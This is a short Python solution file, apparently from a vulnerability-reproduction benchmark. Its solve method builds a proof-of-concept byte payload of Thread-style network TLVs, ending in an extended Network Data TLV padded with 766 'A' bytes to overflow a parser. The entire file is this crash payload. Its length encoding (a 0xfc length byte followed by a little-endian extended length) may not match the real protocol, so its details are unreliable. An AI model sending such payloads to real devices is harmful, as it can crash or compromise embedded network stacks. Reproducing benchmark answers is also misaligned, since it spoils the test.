class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b''
        # Channel TLV
        poc += b'\x00\x02\x00\x0b'
        # PAN ID TLV
        poc += b'\x01\x02\x12\x34'
        # Extended PAN ID TLV
        poc += b'\x02\x08' + b'\xde\xad\xbe\xef\xde\xad\xbe\xef'
        # Network Key TLV
        poc += b'\x03\x10' + b'\x01' * 16
        # Network Key Sequence TLV
        poc += b'\x04\x04\x00\x00\x00\x01'
        # Mesh Local Prefix TLV
        poc += b'\x05\x08\xfd\xde\xad\xbe\xef\x00\x00\x00'
        # Steering Data TLV
        poc += b'\x06\x01\x00'
        # Border Router Locator TLV
        poc += b'\x07\x02\x00\x01'
        # Security Policy TLV
        poc += b'\x08\x03\x02\x00\x50'
        # Active Timestamp TLV
        poc += b'\x09\x08' + b'\x00' * 8
        # Network Data TLV (extended)
        poc += b'\x0c\xfc'  # type 12, length 252
        poc += b'\xbe\x02'  # extended length 766 little-endian
        poc += b'A' * 766
        return poc
